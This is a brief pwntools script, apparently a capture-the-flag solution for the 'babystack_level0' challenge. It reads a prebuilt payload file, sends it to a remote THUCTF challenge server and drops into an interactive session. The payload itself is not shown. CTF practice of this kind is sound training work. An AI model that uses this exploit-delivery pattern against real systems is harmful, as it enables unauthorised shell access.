from pwn import *

bin = b''
with open("lv0_bin", "rb") as f:
    bin = f.read()

#conn = process("./babystack_level0")
conn = remote("nc.thuctf.redbud.info", port=31195)

conn.recvline()
conn.send(bin)
conn.recvline()
conn.interactive()
